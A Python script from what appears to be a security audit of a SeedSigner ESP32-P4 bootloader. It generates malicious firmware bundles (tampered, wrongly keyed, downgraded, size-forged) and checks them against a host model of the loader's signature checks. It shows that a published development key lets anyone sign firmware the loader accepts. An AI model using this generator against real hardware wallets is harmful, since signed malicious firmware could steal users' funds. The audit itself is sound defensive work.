#!/usr/bin/env python3
"""
attack_bundle.py — Phase 14 attack-payload generator + host-side verifier.

Generates every malicious SD-card bundle described in
Phase_14_Security_Analysis.md and, optionally, proves on the HOST that a
forged "validly signed" bundle (T16) passes the exact Layer-2 checks the
Phase 13 loader performs, without needing the board.

Replicates the signing logic of
Phase_13/seedsigner_bootloader_p4_stateless_os/tools/generate_signed_payload.py
(exponent 123456789 == the key embedded as vendor_keys[] in the loader), so a
"good" bundle here is byte-for-byte what a legit release would produce — which
is exactly the point of finding T16: the dev key is public, so ANYONE can
produce an accepted bundle.

Modes
-----
  good           baseline bundle, dev key, platform=seedsigner_esp32p4, ver 1
  tamper         good bundle with a byte flipped inside the payload (T4)
  wrong-key      signed with a DIFFERENT private key (T5)
  raw            raw payload, no Specter header at all (T6)
  wrong-platform platform attr forged to "seedsigner_esp32s3" (T7)
  downgrade      pl_ver = 0 (T8)
  trunc-sig      signature section removed (T9)
  forged-size    pl_size forged larger than the real payload (T10)

Usage
-----
  python3 attack_bundle.py <mode> <raw_payload.bin> <out.bin>
  python3 attack_bundle.py verify <bundle.bin>            # host-side T16 proof
"""

import hashlib
import struct
import sys
import zlib

from ecdsa import SigningKey, SECP256k1
from ecdsa.util import sigencode_string
import bech32

BL_SECT_MAGIC = 0x54434553
BL_SECT_STRUCT_REV = 1
DEV_SECRET = 123456789           # the "vendor" key published in the repo
ATTACK_SECRET = 987654321        # a key the loader does NOT trust


def crc32_fast(data):
    return zlib.crc32(data) & 0xFFFFFFFF


def pack_attribute(key, value):
    if isinstance(value, str):
        value = value.encode('ascii')
    elif isinstance(value, int):
        if value < 256:
            value = struct.pack('<B', value)
        elif value < 65536:
            value = struct.pack('<H', value)
        else:
            value = struct.pack('<I', value)
    return struct.pack('<BB', key, len(value)) + value


def build_section(name, version, payload, attributes=b''):
    attr_list = attributes + b'\x00' * (216 - len(attributes))
    pl_size = len(payload)
    pl_crc = crc32_fast(payload) if pl_size > 0 else 0
    fmt = '<II16sIII216s'
    header = struct.pack(fmt,
                         BL_SECT_MAGIC,
                         BL_SECT_STRUCT_REV,
                         name.encode('ascii'),
                         version,
                         pl_size,
                         pl_crc,
                         attr_list)
    struct_crc = crc32_fast(header)
    header += struct.pack('<I', struct_crc)
    return header + payload


def version_to_sig_str(version):
    major = version // (100 * 1000 * 1000)
    minor = (version // (100 * 1000)) % 1000
    patch = (version // 100) % 1000
    rc_rev = version % 100
    if rc_rev == 99:
        return f"{major}.{minor}.{patch}"
    return f"{major}.{minor}.{patch}rc{rc_rev}"


def sign_main_section(main_section, version, secret):
    """Replicate generate_signed_payload.py signing over a 'main' section."""
    priv = SigningKey.from_secret_exponent(secret, curve=SECP256k1)
    pub = priv.get_verifying_key()
    pub_bytes = pub.to_string("uncompressed")
    fp = hashlib.sha256(pub_bytes).digest()[:16]

    main_hash = hashlib.sha256(main_section).digest()
    digest2 = hashlib.sha256(main_hash).digest()
    hrp = version_to_sig_str(version) + "-"
    converted = bech32.convertbits(digest2, 8, 5, pad=True)
    msg_str = bech32.bech32_encode(hrp, converted)
    msg_bytes = msg_str.encode('ascii')

    prefix = b"\x18Bitcoin Signed Message:\n"
    len_byte = bytes([len(msg_bytes)])
    in_digest = hashlib.sha256(prefix + len_byte + msg_bytes).digest()
    btc_digest = hashlib.sha256(in_digest).digest()
    signature = priv.sign_digest_deterministic(btc_digest, sigencode=sigencode_string)
    r = int.from_bytes(signature[:32], 'big')
    s = int.from_bytes(signature[32:], 'big')
    order = SECP256k1.order
    if s > order // 2:
        s = order - s
    signature = r.to_bytes(32, 'big') + s.to_bytes(32, 'big')
    return fp + signature


def build_bundle(payload, version=1, platform="seedsigner_esp32p4",
                 secret=DEV_SECRET):
    """Full good-path bundle: main section + dev-key signature section."""
    attrs = (pack_attribute(4, platform) +
             pack_attribute(1, "secp256k1-sha256"))
    main_section = build_section("main", version, payload, attrs)
    sig_payload = sign_main_section(main_section, version, secret)
    sig_section = build_section("sign", 1, sig_payload)
    return main_section + sig_section


def host_verify(bundle_path, pub_bytes):
    """Faithful HOST model of main.c's Layer-2 decision tree (Step 2.5).

    Mirrors the loader check-for-check so we can predict, without the board,
    where each attack bundle is stopped:
      1. magic == BL_SECT_MAGIC           (main.c:537)
      2. blsect_validate_header()         (struct CRC) (main.c:540)
      3. platform attr == seedsigner_esp32p4 (main.c:549-550)
      4. pl_ver >= 1 downgrade            (main.c:556)
      5. hash over header+pl_size bytes   (main.c:565)
      6. sig section at 256+pl_size       (main.c:574-575)
      7. secp256k1 multisig verify        (main.c:583)
    Returns (decision, detail).
    """
    data = open(bundle_path, 'rb').read()
    if len(data) < 256 or data[0:4] != b'SECT':
        return "HALT", "main.c:611 No Specter section header — raw images rejected"
    magic, srev = struct.unpack_from('<II', data, 0)
    assert magic == BL_SECT_MAGIC
    pl_ver, pl_size, pl_crc = struct.unpack_from('<III', data, 24)
    struct_crc = struct.unpack_from('<I', data, 252)[0]
    if crc32_fast(data[:252]) != struct_crc:
        return "HALT", "main.c:540 blsect_validate_header() — struct CRC failed"

    # platform attribute (key 4)
    attr = data[36:252]
    platform = None
    p = 0
    while p < len(attr):
        key, size = attr[p], attr[p + 1]
        if key == 0:
            break
        if key == 4:
            platform = attr[p + 2:p + 2 + size].decode('ascii', 'replace')
        p += 2 + size
    if platform != "seedsigner_esp32p4":
        return "HALT", f"main.c:550 Invalid platform attribute: '{platform}'"

    if pl_ver < 1:
        return "HALT", f"main.c:557 Firmware downgrade detected! (pl_ver={pl_ver})"

    # hash over header + pl_size bytes (loader reads pl_size from PSRAM; if
    # pl_size exceeds the on-SD length the read runs past the buffer — T10)
    main_body = data[256:256 + pl_size]
    print(f"  pl_size        : {pl_size} (file main-body available: {len(data) - 256})")
    if pl_size > len(data) - 256:
        print("  ⚠ out-of-buffer read: pl_size > file size (T10 robustness finding)")
    main_hash = hashlib.sha256(data[:256] + main_body).digest()
    digest2 = hashlib.sha256(main_hash).digest()
    hrp = version_to_sig_str(pl_ver) + "-"
    converted = bech32.convertbits(digest2, 8, 5, pad=True)
    msg_str = bech32.bech32_encode(hrp, converted)
    msg_bytes = msg_str.encode('ascii')
    prefix = b"\x18Bitcoin Signed Message:\n"
    in_digest = hashlib.sha256(prefix + bytes([len(msg_bytes)]) + msg_bytes).digest()
    btc_digest = hashlib.sha256(in_digest).digest()

    sig_hdr = data[256 + pl_size:]
    if sig_hdr[0:4] != b'SECT' or sig_hdr[8:12] != b'sign':
        return "HALT", "main.c:605 Signature section missing or invalid"

    fp = sig_hdr[256:256 + 16]
    sig = sig_hdr[256 + 16:256 + 16 + 64]
    print(f"  fingerprint    : {fp.hex()}")
    print(f"  expected fp    : {hashlib.sha256(pub_bytes).digest()[:16].hex()}")

    # Mirror blsig_verify_multisig_internal (bl_signature.c:237-250):
    #  - fingerprint NOT found in vendor_keys[] -> record silently SKIPPED
    #    (find_pubkey returns NULL, the `if (p_pubkey)` body never runs)
    #  - fingerprint found but signature invalid -> blsig_err_verification_fail
    #  - returns n_valid (count), NOT an error, when everything is skipped
    # Caller check (main.c:588): `blsig_is_error(sig_res) || sig_res <
    # SIG_THRESHOLD`. Upstream Specter enforces `p_result >= main_fw_sig_threshold`
    # (bootloader.c verify_multisig); this deployment has one vendor key so
    # SIG_THRESHOLD == 1. (F8: without the threshold, blsig_is_error() ==
    # (sig_res < 0) would treat n_valid == 0 as SUCCESS.)
    SIG_THRESHOLD = 1
    from ecdsa import VerifyingKey
    known_fp = hashlib.sha256(pub_bytes).digest()[:16]
    if fp != known_fp:
        print("  -> fingerprint NOT in vendor_keys[]: record SKIPPED, n_valid=0")
        print(f"  -> main.c:588 n_valid(0) < SIG_THRESHOLD({SIG_THRESHOLD}) == HALT")
        return "HALT", f"main.c:592 Signature verification failed: 0 valid signature(s), need {SIG_THRESHOLD}"
    vk = VerifyingKey.from_string(pub_bytes[1:], curve=SECP256k1)  # 33-byte form
    try:
        ok = vk.verify_digest(sig, btc_digest)
    except Exception:
        ok = False
    if not ok:
        return "HALT", "main.c:590 Signature verification failed — HALTING"
    return "BOOT", "main.c:598 Signature verification PASSED! → continues to JMP handoff"


def vendor_pub_bytes():
    """The uncompressed public key the loader embeds as vendor_keys[0]."""
    priv = SigningKey.from_secret_exponent(DEV_SECRET, curve=SECP256k1)
    return priv.get_verifying_key().to_string("uncompressed")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(2)

    mode = sys.argv[1]

    if mode == "verify":
        print("== Host-side T16 proof: does an attacker bundle pass the loader's checks? ==")
        decision, detail = host_verify(sys.argv[2], vendor_pub_bytes())
        print(f"  result         : {decision} — {detail}")
        sys.exit(0 if decision == "BOOT" else 1)

    if len(sys.argv) < 4:
        print("usage: attack_bundle.py <mode> <raw_payload.bin> <out.bin>")
        sys.exit(2)

    _, raw_path, out_path = sys.argv[0], sys.argv[2], sys.argv[3]
    payload = open(raw_path, 'rb').read()
    print(f"payload: {raw_path} ({len(payload)} bytes)")

    if mode == "good" or mode == "malicious":
        # T16: 'malicious' == 'good'. The dev key (DEV_SECRET) is committed in
        # generate_signed_payload.py and its pubkey is embedded as vendor_keys[]
        # in the loader, so ANY attacker can trivially produce an accepted
        # bundle. The only difference between a "legit" update and an attack is
        # the payload bytes inside — which the attacker fully controls.
        bundle = build_bundle(payload)
    elif mode == "tamper":
        bundle = bytearray(build_bundle(payload))
        flip_at = 256 + len(payload) // 2      # inside the ESP32 image
        bundle[flip_at] ^= 0x01
        bundle = bytes(bundle)
    elif mode == "wrong-key":
        bundle = build_bundle(payload, secret=ATTACK_SECRET)
    elif mode == "raw":
        bundle = payload
    elif mode == "wrong-platform":
        bundle = build_bundle(payload, platform="seedsigner_esp32s3")
    elif mode == "downgrade":
        bundle = build_bundle(payload, version=0)
    elif mode == "trunc-sig":
        bundle = build_bundle(payload)[:256 + len(payload)]
    elif mode == "forged-size":
        real_size = len(payload)
        forged_size = real_size + 16384          # claim 16 KB more than exists
        main_hdr_attrs = (pack_attribute(4, "seedsigner_esp32p4") +
                          pack_attribute(1, "secp256k1-sha256"))
        # header with pl_size forged, pl_crc over the REAL payload
        attr_list = main_hdr_attrs + b'\x00' * (216 - len(main_hdr_attrs))
        fmt = '<II16sIII216s'
        header = struct.pack(fmt, BL_SECT_MAGIC, BL_SECT_STRUCT_REV,
                             b'main', 1, forged_size,
                             crc32_fast(payload), attr_list)
        header += struct.pack('<I', crc32_fast(header))
        main_section = header + payload
        sig_payload = sign_main_section(main_section, 1, DEV_SECRET)
        bundle = main_section + build_section("sign", 1, sig_payload)
    else:
        print(f"unknown mode: {mode}")
        sys.exit(2)

    with open(out_path, 'wb') as f:
        f.write(bundle)
    print(f"wrote {out_path} ({len(bundle)} bytes) [mode={mode}]")


if __name__ == "__main__":
    main()
